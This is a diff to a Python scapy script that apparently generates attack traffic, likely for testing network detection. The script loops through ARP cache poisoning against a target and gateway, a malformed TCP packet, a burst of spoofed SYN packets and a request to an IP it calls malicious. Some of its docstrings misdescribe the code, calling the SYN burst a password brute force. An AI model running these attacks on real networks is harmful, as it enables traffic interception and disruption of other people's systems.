@@ -6,14 +6,24 @@ import time
 import os
 import sys
 
+# Must be run with sudo
+# You should run then sudo pip install -r requirements.txt
+
 # Source : https://www.thepythoncode.com/article/building-arp-spoofer-using-scapy
 # This file generate some attack :
 # ARP spoofing
 
 def get_mac(ip):
     """
-    Returns MAC address of any device connected to the network
-    If ip is down, returns None instead
+    Returns the MAC address of any device connected to the network with the given IP address.
+
+    This function sends an ARP request to the network asking for the MAC address of the device with the given IP address. If the device responds to the request, the function returns its MAC address. If the device does not respond, the function returns None.
+
+    Args:
+        ip (str): The IP address of the device to query.
+
+    Returns:
+        str or None: The MAC address of the device with the given IP address, or None if the device did not respond to the request.
     """
     ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
     if ans:
@@ -21,8 +31,17 @@ def get_mac(ip):
 
 def spoof(target_ip, host_ip, verbose=True):
     """
-    Spoofs `target_ip` saying that we are `host_ip`.
-    it is accomplished by changing the ARP cache of the target (poisoning)
+    Spoofs the ARP cache of `target_ip` to make it believe that we are `host_ip`.
+
+    This function sends an ARP response packet to the target IP address, claiming that the MAC address of `host_ip` is our MAC address. This causes the target to update its ARP cache to associate `host_ip` with our MAC address, allowing us to intercept and modify network traffic between the target and `host_ip`.
+
+    Args:
+        target_ip (str): The IP address of the target to spoof.
+        host_ip (str): The IP address of the host to impersonate.
+        verbose (bool): Whether to print progress messages to the console. Defaults to True.
+
+    Returns:
+        None
     """
     print("Spoofing Attack")
     time.sleep(1)
@@ -42,6 +61,17 @@ def spoof(target_ip, host_ip, verbose=True):
 
 # malformed packet attack
 def single_packet_attack(target):
+    """
+    Sends a single malformed TCP packet to the given IP address.
+
+    This function sends a TCP packet with the PAU flag set to the given IP address. This flag is not a valid TCP flag and may cause network disruption or denial of service.
+
+    Args:
+        target (str): The IP address of the target to send the packet to.
+
+    Returns:
+        None
+    """
     print("single_packet_attack")
     time.sleep(1)
     # Craft a TCP packet with the PAU flag set
@@ -52,6 +82,17 @@ def single_packet_attack(target):
 
 # Brute force attack
 def spam_attack(target):
+    """
+    Sends a burst of TCP SYN packets to the given IP address.
+
+    This function sends 50 TCP SYN packets with a spoofed source IP address of `192.168.0.1` to the given IP address. This simulates a brute force attack, in which an attacker attempts to connect to a service running on the target system with various passwords or credentials.
+
+    Args:
+        target (str): The IP address of the target to send the packets to.
+
+    Returns:
+        None
+    """
     print("Brute force attack")
     time.sleep(1)
     for i in range(50):
@@ -60,6 +101,17 @@ def spam_attack(target):
         time.sleep(0.1)
 
 def bad_url_http_request():
+    """
+    Sends an HTTP GET request to a known-bad IP address.
+
+    This function sends an HTTP GET request to the IP address `89.159.196.94`, which is known to host malicious content. The request is sent to the default HTTP port (port 80) and includes a deliberately malformed HTTP header. This simulates a malicious HTTP request, which may attempt to exploit vulnerabilities in the target system or download malware onto the system.
+
+    Args:
+        None
+
+    Returns:
+        None
+    """
     print("bad_url_http_request")
     time.sleep(1)
     # Create GET request packet
@@ -70,27 +122,34 @@ def bad_url_http_request():
     response = sr1(pkt, verbose=0)
 
 if __name__ == "__main__":
-    # victim ip address
-    target = "192.168.1.95"
-    # gateway ip address
-    host = "192.168.1.254"
-    # print progress to the screen
-    verbose = True
-    # enable ip forwarding
+    parser = argparse.ArgumentParser(description="Generate network attacks")
+    parser.add_argument("--target", metavar="target", type=str, default="192.168.1.95", help="The IP address of the target to attack")
+    parser.add_argument("--host", metavar="host", type=str, default="192.168.1.254", help="The IP address of the host to impersonate")
+    parser.add_argument("-v", "--verbose", action="store_true", help="Print progress messages to the console")
+
+    args = parser.parse_args()
+
+    target = args.target
+    host = args.host
+    verbose = args.verbose
+
+    # enable IP forwarding
     #enable_ip_route()
+
     while True:
         # attack single packet
         single_packet_attack(target)
-        
-        # telling the `target` that we are the `host`
-        # ARP poisonning
+
+        # tell the `target` that we are the `host`
+        # ARP poisoning
         spoof(target, host, verbose)
-        
-        # Brute for simulating
+
+        # simulate a brute force attack
         spam_attack(target)
 
-        # Bas request simulating
+        # simulate a malicious HTTP request
         bad_url_http_request()
 
         # sleep for one second
         time.sleep(5)
+
